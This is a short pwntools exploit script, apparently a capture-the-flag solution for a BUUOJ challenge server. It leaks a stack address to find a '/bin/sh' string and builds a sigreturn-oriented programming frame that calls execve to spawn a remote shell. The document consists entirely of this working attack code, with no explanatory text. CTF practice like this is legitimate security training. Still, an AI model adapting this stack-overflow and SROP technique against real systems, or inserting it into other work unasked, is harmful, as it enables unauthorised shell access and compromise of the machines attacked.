# method one

from pwn import *


p = remote("node4.buuoj.cn", 28966)
context(os="linux", arch="amd64")


main = 0x04004ED 
syscall = 0x00400517
sigreturn = p64(0x004004DA)+p64(syscall)


# get binsh addr
pad = b"/bin/sh\x00"*2+p64(main)
p.send(pad)
p.recv(0x20)
info = u64(p.recv(8).ljust(8, b"\x00"))
binsh = info-0x110 


# sigreturn
frame = SigreturnFrame()
frame.rax = 59    # sys_execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

pad = b"/bin/sh\00"*2+sigreturn+bytes(frame)
p.send(pad)

p.interactive()


